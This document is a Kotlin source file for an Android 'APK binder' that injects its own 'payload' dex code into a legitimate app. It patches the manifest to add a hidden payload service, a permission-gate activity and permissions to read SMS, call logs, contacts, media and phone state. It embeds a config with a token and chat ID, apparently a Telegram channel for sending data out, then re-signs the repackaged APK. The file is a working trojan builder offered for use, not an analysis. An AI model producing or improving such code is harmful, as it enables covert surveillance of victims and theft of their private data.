package Com.devhs.apkbinder.binder

import android.content.Context
import android.content.pm.PackageManager
import android.net.Uri
import androidx.documentfile.provider.DocumentFile
import com.android.apksig.ApkSigner
import Com.devhs.apkbinder.core.Const
import Com.devhs.apkbinder.data.Feature
import Com.devhs.apkbinder.data.LogLevel
import Com.devhs.apkbinder.data.PayloadConfig
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.KeyStore
import java.security.PrivateKey
import java.security.cert.X509Certificate
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.zip.CRC32
import java.util.zip.ZipEntry
import java.util.zip.ZipFile
import java.util.zip.ZipOutputStream

class BinderEngine(private val ctx: Context) {

    private val permissions = listOf(
        "android.permission.INTERNET",
        "android.permission.READ_SMS",
        "android.permission.READ_CALL_LOG",
        "android.permission.READ_CONTACTS",
        "android.permission.READ_MEDIA_IMAGES",
        "android.permission.READ_EXTERNAL_STORAGE",
        "android.permission.READ_PHONE_STATE",
        "android.permission.POST_NOTIFICATIONS",
        "android.permission.FOREGROUND_SERVICE",
        "android.permission.FOREGROUND_SERVICE_DATA_SYNC"
    )

    suspend fun bind(
        source: Uri,
        activity: String,
        label: String,
        features: Set<Feature>,
        config: PayloadConfig,
        outDir: DocumentFile,
        onLog: (LogLevel, String) -> Unit
    ) = withContext(Dispatchers.IO) {

        val logLines = ArrayList<String>()
        fun emit(level: LogLevel, msg: String) {
            onLog(level, msg)
            logLines.add("[" + level.name + "] " + msg)
        }

        val work = File(ctx.cacheDir, "bind_" + System.currentTimeMillis())
        work.mkdirs()

        try {
            emit(LogLevel.INFO, "Preparing workspace...")
            val base = File(work, "base.apk")
            copyUri(source, base)
            if (base.length() < 1024) throw IllegalStateException("Invalid APK file")
            emit(LogLevel.INFO, "Source APK: " + base.length() / 1024 + " KB")

            val originalInfo = try {
                ctx.packageManager.getPackageArchiveInfo(
                    base.absolutePath,
                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
                )
            } catch (_: Throwable) {
                null
            }
            if (originalInfo == null) {
                emit(LogLevel.ERROR, "ORIGINAL APK unreadable by Android")
            } else {
                emit(LogLevel.INFO, "Original package: " + originalInfo.packageName)
                emit(LogLevel.INFO, "Original activities: " + (originalInfo.activities?.size ?: 0))
            }

            val srcZip = ZipFile(base)
            val manifestEntry = srcZip.getEntry("AndroidManifest.xml")
                ?: throw IllegalStateException("No AndroidManifest.xml in APK")
            val manifest = srcZip.getInputStream(manifestEntry).use { it.readBytes() }

            emit(LogLevel.INFO, "Original manifest: " + AxmlPatcher.stats(manifest))
            if (AxmlPatcher.stats(manifest).contains("app=0")) {
                emit(LogLevel.WARN, "No <application> in manifest -> this is a SPLIT apk")
            }

            val originalApp = AxmlPatcher.readApplicationName(manifest)
            emit(LogLevel.INFO, "Original application: " + (originalApp ?: "(none)"))

            emit(LogLevel.INFO, "Patching AndroidManifest.xml...")
            val patched = try {
                AxmlPatcher.patch(
                    manifest,
                    Const.PAYLOAD_APP,
                    Const.PAYLOAD_ACTIVITY,
                    Const.PAYLOAD_SERVICE,
                    permissions
                )
            } catch (t: Throwable) {
                srcZip.close()
                throw IllegalStateException("Manifest patch failed: " + (t.message ?: "unknown"))
            }
            emit(LogLevel.SUCCESS, "Manifest patched: " + manifest.size + " -> " + patched.size)
            emit(LogLevel.INFO, "Patched manifest: " + AxmlPatcher.stats(patched))

            emit(LogLevel.INFO, "Collecting payload dex...")
            val dexes = collectOwnDex()
            if (dexes.isEmpty()) {
                srcZip.close()
                throw IllegalStateException("Payload dex not found")
            }
            emit(LogLevel.INFO, "Dex files: " + dexes.size)

            val maxDex = srcZip.entries().toList()
                .mapNotNull { Regex("^classes(\\d*)\\.dex$").find(it.name) }
                .map { it.groupValues[1].ifEmpty { "1" }.toInt() }
                .maxOrNull() ?: 0

            val cfgBytes = JSONObject().apply {
                put("token", config.token)
                put("chatId", config.chatId)
                put("origApp", originalApp ?: "")
                put("features", JSONArray(config.features))
                put("activity", activity)
            }.toString().toByteArray()

            val unsigned = File(work, "unsigned.apk")
            ZipOutputStream(FileOutputStream(unsigned).buffered()).use { zos ->
                for (e in srcZip.entries().toList()) {
                    if (e.isDirectory) continue
                    if (e.name == "AndroidManifest.xml") continue
                    if (e.name == "assets/" + Const.CONFIG_ASSET) continue
                    if (e.name.startsWith("META-INF/") &&
                        (e.name.endsWith(".SF") || e.name.endsWith(".RSA") ||
                            e.name.endsWith(".DSA") || e.name.endsWith(".MF"))
                    ) continue

                    val data = srcZip.getInputStream(e).use { it.readBytes() }
                    val entry = ZipEntry(e.name)
                    if (e.name == "resources.arsc") {
                        entry.method = ZipEntry.STORED
                        entry.size = data.size.toLong()
                        entry.compressedSize = data.size.toLong()
                        entry.crc = CRC32().apply { update(data) }.value
                    } else entry.method = ZipEntry.DEFLATED
                    zos.putNextEntry(entry)
                    zos.write(data)
                    zos.closeEntry()
                }
                srcZip.close()

                zos.putNextEntry(ZipEntry("AndroidManifest.xml"))
                zos.write(patched)
                zos.closeEntry()

                zos.putNextEntry(ZipEntry("assets/" + Const.CONFIG_ASSET))
                zos.write(cfgBytes)
                zos.closeEntry()

                dexes.forEachIndexed { i, bytes ->
                    zos.putNextEntry(ZipEntry("classes" + (maxDex + i + 1) + ".dex"))
                    zos.write(bytes)
                    zos.closeEntry()
                }
            }
            emit(LogLevel.SUCCESS, "Archive built: " + unsigned.length() / 1024 + " KB")

            val finalApk = File(work, "final.apk")
            try {
                emit(LogLevel.INFO, "Signing APK...")
                sign(unsigned, finalApk)
                emit(LogLevel.SUCCESS, "Signed OK")
            } catch (t: Throwable) {
                emit(LogLevel.WARN, "Signing failed: " + (t.message ?: "unknown"))
                unsigned.copyTo(finalApk, overwrite = true)
            }

            val info = try {
                ctx.packageManager.getPackageArchiveInfo(
                    finalApk.absolutePath,
                    PackageManager.GET_ACTIVITIES or PackageManager.GET_SERVICES
                )
            } catch (t: Throwable) {
                emit(LogLevel.WARN, "Verify error: " + (t.message ?: "unknown"))
                null
            }

            if (info == null) {
                emit(LogLevel.ERROR, "Manifest parse: FAILED")
            } else {
                emit(LogLevel.SUCCESS, "Manifest parse: OK")
                emit(LogLevel.INFO, "Package: " + info.packageName)
                emit(LogLevel.INFO, "App class: " + (info.applicationInfo?.className ?: "(none)"))
                val acts = info.activities?.mapNotNull { it.name } ?: emptyList()
                val hasGate = acts.any { it.endsWith("PermissionGateActivity") }
                emit(if (hasGate) LogLevel.SUCCESS else LogLevel.ERROR, "Permission activity: " + hasGate)
                val srv = info.services?.mapNotNull { it.name } ?: emptyList()
                val hasSrv = srv.any { it.endsWith("PayloadService") }
                emit(if (hasSrv) LogLevel.SUCCESS else LogLevel.ERROR, "Payload service: " + hasSrv)
                emit(LogLevel.INFO, "Activities: " + acts.joinToString(", "))
            }

            val cleanLabel = label.substringAfterLast('/')
                .removeSuffix(".apk")
                .replace(Regex("[^A-Za-z0-9]+"), "_")
                .trim('_')
                .take(40)
                .ifBlank { "App" }
            val name = "Hs_Apk_Binder_" + cleanLabel + "_" + System.currentTimeMillis() + ".apk"

            val doc = outDir.createFile("application/vnd.android.package-archive", name)
                ?: throw IllegalStateException("Cannot create output file")
            ctx.contentResolver.openOutputStream(doc.uri)!!.use { os ->
                finalApk.inputStream().use { it.copyTo(os) }
            }
            emit(LogLevel.SUCCESS, "Saved: " + doc.name)
            emit(LogLevel.SUCCESS, "APK Binding Completed!")

        } catch (t: Throwable) {
            emit(LogLevel.ERROR, "FAILED: " + (t.message ?: t.javaClass.simpleName))
            throw t
        } finally {
            try {
                val stamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                val logDoc = outDir.createFile("text/plain", "Hs_Binder_Log_" + stamp + ".txt")
                if (logDoc != null) {
                    ctx.contentResolver.openOutputStream(logDoc.uri)!!.use { os ->
                        os.write(logLines.joinToString("\n").toByteArray())
                    }
                }
            } catch (_: Throwable) {
            }
            work.deleteRecursively()
        }
    }

    private fun copyUri(uri: Uri, target: File) {
        val stream = if (uri.scheme == "file") {
            File(uri.path!!).inputStream()
        } else {
            ctx.contentResolver.openInputStream(uri) ?: throw IllegalStateException("Cannot open APK")
        }
        stream.use { input -> target.outputStream().use { input.copyTo(it) } }
    }

    private fun collectOwnDex(): List<ByteArray> {
        val info = ctx.packageManager.getApplicationInfo(ctx.packageName, PackageManager.GET_META_DATA)
        val paths = ArrayList<String>()
        info.sourceDir?.let { paths.add(it) }
        info.splitSourceDirs?.let { paths.addAll(it) }

        val out = ArrayList<ByteArray>()
        for (path in paths) {
            try {
                ZipFile(path).use { z ->
                    z.entries().toList()
                        .filter { Regex("^classes\\d*\\.dex$").matches(it.name) }
                        .sortedBy { it.name }
                        .forEach { e -> out.add(z.getInputStream(e).use { it.readBytes() }) }
                }
            } catch (_: Throwable) {
            }
        }
        return out
    }

    private fun sign(input: File, output: File) {
        val ks = KeyStore.getInstance("PKCS12")
        ctx.assets.open(Const.KEYSTORE_ASSET).use { ks.load(it, Const.KS_PASS.toCharArray()) }
        val key = ks.getKey(Const.KS_ALIAS, Const.KS_PASS.toCharArray()) as PrivateKey
        val cert = ks.getCertificate(Const.KS_ALIAS) as X509Certificate

        val signerConfig = ApkSigner.SignerConfig.Builder(Const.KS_ALIAS, key, listOf(cert)).build()
        ApkSigner.Builder(listOf(signerConfig))
            .setInputApk(input)
            .setOutputApk(output)
            .setV1SigningEnabled(true)
            .setV2SigningEnabled(true)
            .setV3SigningEnabled(true)
            .setMinSdkVersion(26)
            .build()
            .sign()
    }
}
